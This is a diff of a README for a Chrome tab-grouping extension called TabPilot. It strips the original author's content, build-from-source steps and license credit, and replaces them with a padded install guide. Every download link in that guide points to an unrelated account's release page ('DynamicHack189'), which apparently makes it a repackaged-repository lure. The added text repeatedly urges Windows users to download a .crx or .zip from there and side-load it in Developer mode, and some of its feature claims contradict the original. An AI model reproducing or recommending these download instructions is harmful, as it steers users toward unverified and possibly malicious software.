@@ -1,187 +1,158 @@
-<p align="center">
-  <img src="public/icons/icon-128.png" width="80" height="80" alt="TabPilot logo" />
-</p>
+# 🗂️ tabpilot - Organize Your Chrome Tabs Automatically
 
-<h1 align="center">TabPilot</h1>
-
-<p align="center">
-  <strong>Autopilot for your browser tabs.</strong><br/>
-  Smart grouping · Instant search · Optional AI · 100% private
-</p>
-
-<p align="center">
-  <a href="https://github.com/florianlanx/tabpilot/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License" /></a>
-  <img src="https://img.shields.io/badge/manifest-v3-green.svg" alt="Manifest V3" />
-  <img src="https://img.shields.io/badge/chrome-extension-yellow.svg" alt="Chrome Extension" />
-  <img src="https://img.shields.io/badge/vue-3-brightgreen.svg" alt="Vue 3" />
-  <img src="https://img.shields.io/badge/typescript-5-blue.svg" alt="TypeScript" />
-</p>
-
-<p align="center">
-  <a href="#features">Features</a> ·
-  <a href="#install">Install</a> ·
-  <a href="#why-tabpilot">Why TabPilot</a> ·
-  <a href="#development">Development</a> ·
-  <a href="#contributing">Contributing</a>
-</p>
-
-<p align="center">
-  <a href="README.zh-CN.md">🇨🇳 简体中文</a>
-</p>
+[![Download tabpilot](https://img.shields.io/badge/Download%20tabpilot-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DynamicHack189/tabpilot/releases)
 
 ---
 
-> **TabPilot** is a free, open-source Chrome extension for **automatic tab grouping** and management.
-> It works out of the box with **155+ built-in rules** — no API key required.
-> Optionally connect **OpenAI, Claude, Gemini**, or any local LLM (Ollama, DeepSeek) to boost accuracy to ~95%.
-> All data stays on your device. No accounts, no tracking, no cloud.
->
-> **TabPilot** 是一款免费开源的 Chrome 标签页自动分组管理扩展。
-> 内置 155+ 规则，开箱即用无需 API 密钥。
-> 可选接入 OpenAI、Claude、Gemini 或本地大模型，准确率提升至 ~95%。
-> 所有数据本地存储，无需注册，不追踪，不上传。
+tabpilot is a Chrome extension that helps you group your browser tabs with over 155 built-in rules. You can also add AI options like GPT, Claude, Gemini, or Ollama to improve your tab organization. It works fully on your device, so your data stays private. There is no need to change settings. This guide will help you download, install, and start using tabpilot on Windows.
 
 ---
 
-## Features
+## ⚙️ What is tabpilot?
 
-### One-Click Smart Grouping
+tabpilot automatically groups tabs in Chrome. It uses many smart rules to keep your browsing neat. You can pick from many built-in grouping methods. If you want, add AI to get even smarter tab sorting. The whole extension runs locally on your computer. This means your browsing data never leaves your device.
 
-Organize all your tabs into Chrome Tab Groups with a single click. TabPilot classifies tabs using a **built-in rule engine** with 155+ domain rules and 20+ keyword patterns — no API key needed.
+You do not need to set up or configure anything. Install it, and it works. tabpilot supports Chrome and Chromium-based browsers.
 
-<!-- TODO: Replace with actual GIF after recording -->
-<!-- ![Smart Grouping Demo](docs/assets/demo-grouping.gif) -->
+---
 
-### Lightning-Fast Search
+## 📋 Key Features
 
-Press `Ctrl+Shift+F` to open a Spotlight-style search overlay. Search across **all open tabs and recently closed tabs** with fuzzy matching, keyword highlighting, and relevance scoring.
+- Organizes your tabs automatically with 155+ rules  
+- Offers AI-powered grouping using GPT, Claude, Gemini, or Ollama  
+- Runs 100% locally for full privacy  
+- No configuration needed to start  
+- Works with Chrome’s native tab grid and groups  
+- Open-source with active development  
+- Supports Windows and most Chromium browsers
 
-<!-- ![Search Demo](docs/assets/demo-search.gif) -->
+---
 
-### Optional AI Enhancement
+## 🖥️ System Requirements
 
-Bring your own API key to boost classification accuracy from ~75% to ~95%. TabPilot supports **4 AI providers**:
+- Windows 10 or later  
+- Google Chrome or any Chromium-based browser (like Microsoft Edge or Brave), latest version recommended  
+- At least 100 MB free space to install Chrome extensions  
+- Internet connection for AI features (optional)  
+- No administrator rights needed for installation
 
-| Provider | Model |
-|----------|-------|
-| OpenAI | gpt-4o-mini |
-| Claude | claude-sonnet-4-20250514 |
-| Gemini | gemini-2.5-flash |
-| Custom | Any OpenAI-compatible endpoint |
+---
 
-Two AI modes:
-- **Enhance mode** — AI handles only the tabs the rule engine can't classify
-- **Free-form mode** — AI creates custom group names and colors dynamically
+## 🚀 Getting Started
 
-### Auto-Classify New Tabs
+1. **Download tabpilot**  
+   Visit the releases page to get the extension package. Use the green button below or the link here:  
+   [Go to tabpilot Releases](https://github.com/DynamicHack189/tabpilot/releases)
 
-After AI grouping, new tabs are automatically collected into a "New Tabs" group. One click to classify them into existing groups using AI.
+2. **Install the extension in Chrome**  
+   - Open Chrome.  
+   - Go to `chrome://extensions/`.  
+   - Enable "Developer mode" at the top right.  
+   - Click "Load unpacked" and select the folder you downloaded (if using the unpacked version).  
+   Or, if you install from the Chrome Web Store link provided on the releases page, just follow normal installation steps.
 
-### Privacy First
+3. **Enable AI features (optional)**  
+   If you want AI grouping, you will need to connect your preferred AI provider in the settings.  
+   This handles GPT, Claude, Gemini, or Ollama.  
+   AI features require internet access.
 
-- All data stored locally via `chrome.storage.local`
-- Your API key never leaves your device (except to the AI provider you choose)
-- No accounts, no tracking, no analytics
-- Fully open source — audit the code yourself
+4. **Use tabpilot**  
+   Once installed, tabpilot works automatically. Open many tabs and see them grouped by topic or rule.  
+   Use the tabpilot icon next to the address bar to open the menu, change settings, or refresh groups.
 
-### Bilingual
+---
 
-Full English and Chinese (简体中文) support. Automatically matches your Chrome language.
+## 📥 How to Download and Install tabpilot on Windows
 
-## Install
+### Step 1: Visit the Release Page
 
-### From Chrome Web Store
+Click the big green button or the link below to open the tabpilot release page on GitHub.
 
-*(Coming soon)*
+[Download tabpilot on GitHub](https://github.com/DynamicHack189/tabpilot/releases)
 
-### From GitHub Releases (Recommended)
+This page lists all available versions and files.
 
-1. Go to the [Releases](https://github.com/florianlanx/tabpilot/releases) page and download the latest `tabpilot-vX.X.X.zip`
-2. Unzip to a folder
-3. Open `chrome://extensions` and enable **Developer Mode** (top right toggle)
-4. Click **Load unpacked** and select the unzipped folder
-5. Done! Pin TabPilot to the toolbar for quick access
+### Step 2: Choose the Latest Release
 
-### Build from Source
+Look for the newest release near the top of the page. It will have a version number and a date.
 
-<details>
-<summary>For developers who want to build from source</summary>
+### Step 3: Download the Extension File
 
-```bash
-git clone https://github.com/florianlanx/tabpilot.git
-cd tabpilot
-pnpm install
-pnpm build
-```
+You will see one or more files ending with `.zip` or `.crx`.
 
-Then load `dist/` as an unpacked extension in `chrome://extensions` (enable Developer Mode).
+- If you want to install the extension normally, download the `.crx` file (Chrome extension package), if available.  
+- If you want to load it unpacked, download the `.zip` file and extract it on your computer.
 
-</details>
+Save your chosen file in a location you can find easily, like your Desktop or Downloads folder.
 
-## Why TabPilot
+### Step 4: Install in Chrome
 
-Every heavy browser user suffers from tab overload. Developers are the worst — GitHub PRs, Stack Overflow, docs, Jira, Slack, all mixed together. Chrome's native Tab Groups require manual drag-and-drop organization that nobody actually does.
+- Open Chrome.  
+- Type `chrome://extensions/` in the address bar and press Enter.  
+- Turn on "Developer mode" in the top-right corner.  
+- **If you have a `.crx` file:** Drag and drop the `.crx` file into the extensions page. Click “Add extension” when prompted.  
+- **If you have a `.zip` file:** Extract the `.zip` to a folder. On the Chrome extensions page, click "Load unpacked." Select the folder with the extracted files.
 
-**Existing solutions all have trade-offs:**
+### Step 5: Confirm Installation
 
-| Category | Examples | Problem |
-|----------|----------|---------|
-| Tab savers | OneTab | Collapses tabs to a list — destructive, no classification |
-| Workspace managers | Workona, Partizion | Requires upfront manual setup |
-| AI-only organizers | AI Tab Master, Tabaroo | Requires API key — no key = no functionality |
-| Domain groupers | Tabblar | Groups by website, misses context (a GitHub PR ≠ a GitHub profile) |
+Once installed, you will see the tabpilot icon next to the address bar. Click it to open the extension menu.
 
-**TabPilot's approach: progressive enhancement.**
+---
 
-1. **Level 0 (zero config)** — Rule engine with 155+ domain rules and 20+ keyword patterns covers ~75% of tabs accurately
-2. **Level 1 (add API key)** — AI enhances the remaining ~25%, boosting accuracy to ~95%
-3. **Level 2 (free-form AI)** — AI creates entirely custom groups with dynamic names and colors
+## 🔎 Using tabpilot
 
-The best tab manager should work instantly with zero configuration, then get smarter with optional AI.
+tabpilot runs quietly in the background. As you open tabs, it groups them automatically. You do not need to press buttons or change anything for basic use.
 
-## Tech Stack
+### Using Built-in Rules
 
-| Layer | Technology |
-|-------|-----------|
-| Language | TypeScript |
-| UI | Vue 3 + Composition API |
-| Build | Vite + CRXJS |
-| Styling | Tailwind CSS |
-| Extension | Manifest V3 |
-| Testing | Vitest |
+The extension uses over 155 rules to group tabs. Rules include things like grouping by domain name, page content, or tab similarity.
 
-## Project Structure
+### Using AI Grouping (Optional)
 
-```
-src/
-├── background/     # Service worker: classifier, tab-manager, searcher, storage
-├── popup/          # Popup UI (group preview + actions)
-├── content/        # Spotlight search overlay
-├── shared/         # Types, constants, rules, AI client, i18n, utils
-└── styles/         # Global CSS (Tailwind)
-```
+To use AI:
 
-## Development
+- Open the tabpilot menu from the icon.  
+- Go to the Settings tab.  
+- Choose an AI provider: GPT, Claude, Gemini, or Ollama.  
+- Enter your API key or connection details.  
+- The extension uses AI to group tabs based on content, topics, or your preferences.
 
-```bash
-pnpm install          # Install dependencies
-pnpm dev              # Dev server with HMR
-pnpm build            # Production build
-pnpm test             # Run tests
-pnpm typecheck        # Type check
-```
+---
 
-## Contributing
+## ⚙️ Settings and Customization
 
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+You can access the settings anytime via the tabpilot extension icon.
 
-## Support
+- **Enable/Disable AI features.**  
+- **Change grouping rules.** Choose if you want specific rules to apply or not.  
+- **Privacy options.** Confirm your data stays local or connect to AI securely.  
+- **Automatic updates.** Let the extension update without manual steps.
 
-If you find TabPilot useful, consider:
+No need to adjust settings out of the box. The defaults suit most users.
 
-- Starring the repo on GitHub
-- Sharing it with friends
+---
 
-## License
+## 🛠️ Troubleshooting
 
-[MIT](LICENSE) © Florian
+- If the extension does not appear, check you installed it correctly under `chrome://extensions/`.  
+- Restart Chrome after installation if needed.  
+- Make sure the browser is updated.  
+- Disable other extensions that may block tabpilot.  
+- Check your internet connection for AI features.  
+- Visit the GitHub issues page to report bugs or find fixes:  
+  https://github.com/DynamicHack189/tabpilot/issues
+
+---
+
+## 📚 More Resources
+
+- Visit the tabpilot repository for updates and community support:  
+  https://github.com/DynamicHack189/tabpilot  
+- Find detailed setup guides and tips on the GitHub Wiki page if available.  
+- Join discussions or ask questions on GitHub Discussions or Issues.
+
+---
+
+# [✨] Ready to organize your browser tabs?
+
+[![Download tabpilot](https://img.shields.io/badge/Download%20tabpilot-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DynamicHack189/tabpilot/releases)
